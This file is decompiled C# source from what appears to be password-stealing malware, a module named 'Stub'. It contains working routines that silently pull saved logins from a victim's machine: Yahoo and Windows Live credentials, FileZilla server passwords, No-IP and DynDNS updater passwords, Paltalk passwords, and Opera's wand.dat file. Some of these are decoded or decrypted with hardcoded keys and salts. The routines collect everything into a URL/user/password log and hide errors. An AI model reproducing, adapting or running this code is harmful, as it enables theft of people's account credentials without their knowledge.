using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x0200000D RID: 13
	[StandardModule]
	internal sealed class p
	{
		// Token: 0x0600003F RID: 63 RVA: 0x00002F58 File Offset: 0x00001158
		public static void Yahoo()
		{
			try
			{
				foreach (string str in Registry.CurrentUser.OpenSubKey("Software\\Yahoo\\Profiles").GetSubKeyNames())
				{
					p.OL = p.OL + "|URL| http://Yahoo.com\r\n|USR| " + str + "\r\n|PWD| \r\n";
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000040 RID: 64
		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool CredEnumerateW(string filter, uint flag, out uint count, out IntPtr pCredentials);

		// Token: 0x06000041 RID: 65 RVA: 0x00002FDC File Offset: 0x000011DC
		public static void Msn()
		{
			checked
			{
				try
				{
					IntPtr zero = IntPtr.Zero;
					uint num;
					bool flag = p.CredEnumerateW("WindowsLive:name=*", 0u, out num, out zero);
					if (flag)
					{
						int num2 = 0;
						int num3 = (int)(unchecked((ulong)num) - 1UL);
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							try
							{
								p.OL += "|URL| http://hotmail.com\r\n";
								p.CREDENTIAL credential = (p.CREDENTIAL)Marshal.PtrToStructure(Marshal.ReadIntPtr(zero, IntPtr.Size * num4), typeof(p.CREDENTIAL));
								p.OL = p.OL + "|USR| " + credential.UserName + "\r\n";
								try
								{
									p.OL = p.OL + "|PWD| " + Marshal.PtrToStringBSTR(credential.CredentialBlob) + "\r\n";
								}
								catch (Exception ex)
								{
									p.OL += "|PWD| \r\n";
								}
							}
							catch (Exception ex2)
							{
							}
							num4++;
						}
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}

		// Token: 0x06000042 RID: 66 RVA: 0x0000315C File Offset: 0x0000135C
		public static void P1()
		{
			try
			{
				string[] array = Strings.Split(File.ReadAllText(Interaction.Environ("APPDATA") + "\\FileZilla\\recentservers.xml"), "<Server>", -1, CompareMethod.Binary);
				foreach (string expression in array)
				{
					string[] array3 = Strings.Split(expression, "\r\n", -1, CompareMethod.Binary);
					foreach (string text in array3)
					{
						bool flag = text.Contains("<Host>");
						if (flag)
						{
							p.OL = p.OL + "|URL| " + Strings.Split(Strings.Split(text, "<Host>", -1, CompareMethod.Binary)[1], "</Host>", -1, CompareMethod.Binary)[0] + "\r\n";
						}
						flag = text.Contains("<User>");
						if (flag)
						{
							p.OL = p.OL + "|USR| " + Strings.Split(Strings.Split(text, "<User>", -1, CompareMethod.Binary)[1], "</User>", -1, CompareMethod.Binary)[0] + "\r\n";
						}
						flag = text.Contains("<Pass>");
						if (flag)
						{
							p.OL = p.OL + "|PWD| " + Strings.Split(Strings.Split(text, "<Pass>", -1, CompareMethod.Binary)[1], "</Pass>", -1, CompareMethod.Binary)[0] + "\r\n";
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000043 RID: 67 RVA: 0x0000330C File Offset: 0x0000150C
		public static void P2()
		{
			try
			{
				string keyName = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC";
				string text = Conversions.ToString(Registry.GetValue(keyName, "USERname", ""));
				string text2 = Conversions.ToString(Registry.GetValue(keyName, "Password", ""));
				bool flag = Operators.CompareString(text, "", false) == 0;
				if (!flag)
				{
					p.OL = string.Concat(new string[]
					{
						p.OL,
						"|URL| http://no-ip.com\r\n|USR| ",
						text,
						"\r\n|PWD| ",
						text2,
						"\r\n"
					});
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000044 RID: 68
		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
		private static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

		// Token: 0x06000045 RID: 69 RVA: 0x000033DC File Offset: 0x000015DC
		public static string HWD()
		{
			string result;
			try
			{
				string text = Interaction.Environ("SystemDrive") + "\\";
				string text2 = null;
				int nVolumeNameSize = 0;
				int num = 0;
				int num2 = 0;
				string text3 = null;
				int number;
				p.GetVolumeInformation(ref text, ref text2, nVolumeNameSize, ref number, ref num, ref num2, ref text3, 0);
				result = Conversion.Hex(number);
			}
			catch (Exception ex)
			{
				result = "ERR";
			}
			return result;
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00003468 File Offset: 0x00001668
		public static void paltalk()
		{
			checked
			{
				try
				{
					char[] array = p.HWD().ToCharArray();
					RegistryKey registryKey = Registry.CurrentUser;
					registryKey = Registry.CurrentUser.OpenSubKey("Software\\Paltalk");
					string[] subKeyNames = registryKey.GetSubKeyNames();
					registryKey.Close();
					foreach (string text in subKeyNames)
					{
						string text2 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Paltalk\\" + text, "pwd", ""));
						char[] array3 = text2.ToCharArray();
						string[] array4 = new string[(int)Math.Round((double)text2.Length / 4.0) + 1];
						int j;
						while (j <= Information.UBound(array3, 1) - 4)
						{
							bool flag = j < Information.UBound(array3, 1) - 4;
							int num;
							if (flag)
							{
								array4[num] = Conversions.ToString(array3[j]) + Conversions.ToString(array3[j + 1]) + Conversions.ToString(array3[j + 2]);
							}
							j += 4;
							num++;
						}
						string text3 = "";
						string text4 = text;
						int k = 0;
						int length = text4.Length;
						while (k < length)
						{
							char value = text4[k];
							text3 += Conversions.ToString(value);
							int num2;
							bool flag = num2 <= Information.UBound(array, 1);
							if (flag)
							{
								text3 += Conversions.ToString(array[num2]);
							}
							num2++;
							k++;
						}
						text3 = text3 + text3 + text3;
						char[] array5 = text3.ToCharArray();
						string text5 = "";
						text5 += Conversions.ToString(Strings.Chr((int)Math.Round(unchecked(Conversions.ToDouble(array4[0]) - 122.0 - (double)Strings.Asc(text3.Substring(checked(text3.Length - 1), 1))))));
						int num3 = 1;
						int num4 = Information.UBound(array4, 1);
						int num5 = num3;
						for (;;)
						{
							int num6 = num5;
							int num7 = num4;
							if (num6 > num7)
							{
								break;
							}
							bool flag = array4[num5] == null;
							if (!flag)
							{
								char value2 = Strings.Chr((int)Math.Round(unchecked(Conversions.ToDouble(array4[num5]) - (double)num5 - (double)Strings.Asc(array5[checked(num5 - 1)]) - 122.0)));
								text5 += Conversions.ToString(value2);
							}
							num5++;
						}
						p.OL = string.Concat(new string[]
						{
							p.OL,
							"|URL| http://Paltalk.com\r\n|USR| ",
							text,
							"\r\n|PWD| ",
							text5,
							"\r\n"
						});
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x0000376C File Offset: 0x0000196C
		public static void dyn()
		{
			checked
			{
				try
				{
					string str = Strings.Replace(Interaction.Environ("ALLUSERSPROFILE") + "\\", "\\\\", "\\", 1, -1, CompareMethod.Binary);
					string text = str + "DynDNS\\Updater\\config.dyndns";
					bool flag = File.Exists(text);
					if (flag)
					{
						Array array = File.ReadAllLines(text);
						try
						{
							foreach (object value in array)
							{
								string text2 = Conversions.ToString(value);
								flag = (Strings.InStr(text2.ToLower(), "username=", CompareMethod.Binary) > 0);
								string text3;
								if (flag)
								{
									text3 = Strings.Split(text2, "=", -1, CompareMethod.Binary)[1];
								}
								flag = (Strings.InStr(text2.ToLower(), "password=", CompareMethod.Binary) > 0);
								if (flag)
								{
									string text4 = Strings.Split(text2, "=", -1, CompareMethod.Binary)[1];
									int num = 1;
									int num2 = Strings.Len(text4);
									int num3 = num;
									string text5;
									for (;;)
									{
										int num4 = num3;
										int num5 = num2;
										if (num4 > num5)
										{
											break;
										}
										text5 += Conversions.ToString(Strings.Chr((int)Math.Round(Conversion.Val("&H" + Strings.Mid(text4, num3, 2)))));
										num3 += 2;
									}
									int num6 = 1;
									int num7 = Strings.Len(text5);
									int num8 = num6;
									for (;;)
									{
										int num9 = num8;
										int num5 = num7;
										if (num9 > num5)
										{
											break;
										}
										int num10;
										StringType.MidStmtStr(ref text5, num8, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(text5, num8, 1)) ^ Strings.Asc(Strings.Mid("t6KzXhCh", num10 + 1, 1)))));
										num10 = (num10 + 1) % 8;
										num8++;
									}
									flag = (text3.Length == 0);
									if (flag)
									{
										break;
									}
									p.OL = string.Concat(new string[]
									{
										p.OL,
										"|URL| http://DynDns.com\r\n|USR| ",
										text3,
										"\r\n|PWD| ",
										text5,
										"\r\n"
									});
									break;
								}
							}
						}
						finally
						{
							IEnumerator enumerator;
							flag = (enumerator is IDisposable);
							if (flag)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000048 RID: 72 RVA: 0x000039E4 File Offset: 0x00001BE4
		public static void GetOpera()
		{
			bool flag = File.Exists(p.path + "\\Opera\\Opera\\wand.dat");
			if (flag)
			{
				p.path += "\\Opera\\Opera\\wand.dat";
			}
			else
			{
				flag = File.Exists(p.path + "\\Opera\\Opera\\profile\\wand.dat");
				if (flag)
				{
					p.path += "\\Opera\\Opera\\profile\\wand.dat";
				}
			}
			checked
			{
				try
				{
					byte[] array = File.ReadAllBytes(p.path);
					int num = 0;
					int num2 = array.Length - 5;
					int num3 = num;
					for (;;)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						flag = (array[num3] == 0 && array[num3 + 1] == 0 && array[num3 + 2] == 0 && array[num3 + 3] == 8);
						if (flag)
						{
							int num6 = (int)array[num3 + 15];
							byte[] array2 = new byte[8];
							byte[] array3 = new byte[num6 - 1 + 1];
							Array.Copy(array, num3 + 4, array2, 0, array2.Length);
							Array.Copy(array, num3 + 16, array3, 0, array3.Length);
							p.DOutput = Conversions.ToString(Operators.AddObject(p.DOutput, Operators.ConcatenateObject(p.decrypt2_method(array2, array3), "\r\n")));
							num3 += 11 + num6;
						}
						num3++;
					}
					string[] array4 = Strings.Split(p.DOutput, "\r\n", -1, CompareMethod.Binary);
					int num7 = 0;
					int num8 = array4.Length - 1;
					int num9 = num7;
					for (;;)
					{
						int num10 = num9;
						int num5 = num8;
						if (num10 > num5)
						{
							break;
						}
						string text = p.FL(array4[num9]);
						string text2 = "";
						string text3 = "";
						flag = (text.ToLower().StartsWith("http://") | text.ToLower().StartsWith("https://"));
						if (flag)
						{
							string text4 = text;
							flag = (num9 + 2 < array4.Length);
							if (flag)
							{
								int num11 = num9 + 1;
								int num12 = num9 + 2;
								int num13 = num11;
								for (;;)
								{
									int num14 = num13;
									num5 = num12;
									if (num14 > num5)
									{
										break;
									}
									string text5 = array4[num13];
									flag = (text5.ToLower().StartsWith("http://") | text5.ToLower().StartsWith("https://"));
									if (flag)
									{
										break;
									}
									flag = (num13 == num9 + 2);
									if (flag)
									{
										text2 = p.FL(text5);
									}
									num13++;
								}
							}
							flag = (num9 + 4 < array4.Length);
							if (flag)
							{
								int num15 = num9 + 1;
								int num16 = num9 + 4;
								int num17 = num15;
								for (;;)
								{
									int num18 = num17;
									num5 = num16;
									if (num18 > num5)
									{
										break;
									}
									string text6 = array4[num17];
									flag = (text6.ToLower().StartsWith("http://") | text6.ToLower().StartsWith("https://"));
									if (flag)
									{
										break;
									}
									flag = (num17 == num9 + 4);
									if (flag)
									{
										text3 = p.FL(text6);
									}
									num17++;
								}
							}
							p.OL = string.Concat(new string[]
							{
								p.OL,
								"|URL| ",
								text4,
								"\r\n|USR| ",
								text2,
								"\r\n|PWD| ",
								text3,
								"\r\n"
							});
						}
						num9++;
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00003D60 File Offset: 0x00001F60
		public static string FL(string s)
		{
			string text = "abcdefghijklmnopqrstuvwxyz1234567890_-.~!@#$%^&*()[{]}\\|';:,<>/?+=";
			string text2 = "";
			int i = 0;
			int length = s.Length;
			checked
			{
				while (i < length)
				{
					string text3 = Conversions.ToString(s[i]);
					bool flag = text.Contains(text3.ToLower());
					if (flag)
					{
						text2 += text3;
					}
					i++;
				}
				return text2;
			}
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00003DD4 File Offset: 0x00001FD4
		public static object decrypt2_method(byte[] key, byte[] encrypt_data)
		{
			checked
			{
				object result;
				try
				{
					MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
					md5CryptoServiceProvider.Initialize();
					byte[] array = new byte[p.opera_salt.Length + (key.Length - 1) + 1];
					Array.Copy(p.opera_salt, array, p.opera_salt.Length);
					Array.Copy(key, 0, array, p.opera_salt.Length, key.Length);
					byte[] array2 = md5CryptoServiceProvider.ComputeHash(array);
					array = new byte[array2.Length + p.opera_salt.Length + (key.Length - 1) + 1];
					Array.Copy(array2, array, array2.Length);
					Array.Copy(p.opera_salt, 0, array, array2.Length, p.opera_salt.Length);
					Array.Copy(key, 0, array, array2.Length + p.opera_salt.Length, key.Length);
					byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(array);
					TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
					tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
					tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
					byte[] array3 = new byte[24];
					byte[] array4 = new byte[8];
					Array.Copy(array2, array3, array2.Length);
					Array.Copy(sourceArray, 0, array3, array2.Length, 8);
					Array.Copy(sourceArray, 8, array4, 0, 8);
					tripleDESCryptoServiceProvider.Key = array3;
					tripleDESCryptoServiceProvider.IV = array4;
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					byte[] bytes = cryptoTransform.TransformFinalBlock(encrypt_data, 0, encrypt_data.Length);
					string @string = Encoding.Unicode.GetString(bytes);
					result = @string;
				}
				catch (Exception ex)
				{
					result = "";
				}
				return result;
			}
		}

		// Token: 0x04000012 RID: 18
		public static string OL;

		// Token: 0x04000013 RID: 19
		private static byte[] opera_salt = new byte[]
		{
			131,
			125,
			252,
			15,
			142,
			179,
			232,
			105,
			115,
			175,
			byte.MaxValue
		};

		// Token: 0x04000014 RID: 20
		private static byte[] key_size = new byte[]
		{
			0,
			0,
			0,
			8
		};

		// Token: 0x04000015 RID: 21
		private static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x04000016 RID: 22
		public static string DOutput;

		// Token: 0x0200000E RID: 14
		internal struct CREDENTIAL
		{
			// Token: 0x04000017 RID: 23
			public int Flags;

			// Token: 0x04000018 RID: 24
			public int Type;

			// Token: 0x04000019 RID: 25
			[MarshalAs(UnmanagedType.LPWStr)]
			public string TargetName;

			// Token: 0x0400001A RID: 26
			[MarshalAs(UnmanagedType.LPWStr)]
			public string Comment;

			// Token: 0x0400001B RID: 27
			public long LastWritten;

			// Token: 0x0400001C RID: 28
			public int CredentialBlobSize;

			// Token: 0x0400001D RID: 29
			public IntPtr CredentialBlob;

			// Token: 0x0400001E RID: 30
			public int Persist;

			// Token: 0x0400001F RID: 31
			public int AttributeCount;

			// Token: 0x04000020 RID: 32
			public IntPtr Attributes;

			// Token: 0x04000021 RID: 33
			[MarshalAs(UnmanagedType.LPWStr)]
			public string TargetAlias;

			// Token: 0x04000022 RID: 34
			[MarshalAs(UnmanagedType.LPWStr)]
			public string UserName;
		}
	}
}
